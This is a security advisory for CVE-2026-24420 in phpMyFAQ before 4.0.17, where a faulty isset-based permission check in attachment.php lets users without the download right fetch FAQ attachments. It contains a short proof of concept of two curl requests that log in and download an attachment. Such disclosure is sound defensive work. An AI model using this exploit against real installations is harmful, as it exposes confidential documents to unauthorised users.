# [M] phpMyFAQ: Attachment download allowed without dlattachment right (broken access control)

## Summary
Severity: Medium
Advisory: GHSA-7p9h-m7m8-vhhv
CVE: CVE-2026-24420
CWE: CWE-284
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-01-23
Source: https://github.com/advisories/GHSA-7p9h-m7m8-vhhv
Type: github-advisory

## Affected
- Packagist: `phpmyfaq/phpmyfaq` — affected >=0 <4.0.17
- Packagist: `thorsten/phpmyfaq` — affected >=0 <4.0.17

## Details
### Summary
A logged‑in user without the dlattachment right can download FAQ attachments. This is due to a permissive permission check in attachment.php that treats the mere presence of a right key as authorization and a flawed group/user logic expression.

### Details
In attachment.php, the access decision uses:
```($groupPermission || ($groupPermission && $userPermission)) && isset($permission['dlattachment'])```
isset() returns true even when the right value is false, and the logic simplifies to $groupPermission for some permission modes. As a result, a user without dlattachment can still access the attachment.

### PoC
Precondition: A non‑admin user exists; an attachment is associated to a FAQ record; records.allowDownloadsForGuests = false.
Log in as a non‑admin user without dlattachment.
Request the attachment download endpoint.
```
curl -c /tmp/pmf_api_cookies.txt \
  -H 'Content-Type: application/json' \
  -d '{"username":"tester","password":"Test1234!"}' \
  http://192.168.40.16/phpmyfaq/api/v3.0/login

curl -i -b /tmp/pmf_api_cookies.txt \
  "http://192.168.40.16/phpmyfaq/index.php?action=attachment&id=1"
```

### Impact
Unauthorized users can download attachments (confidentiality breach). Depending on content, this may expose sensitive documents.

## References
- https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-7p9h-m7m8-vhhv
- https://nvd.nist.gov/vuln/detail/CVE-2026-24420
- https://github.com/thorsten/phpMyFAQ
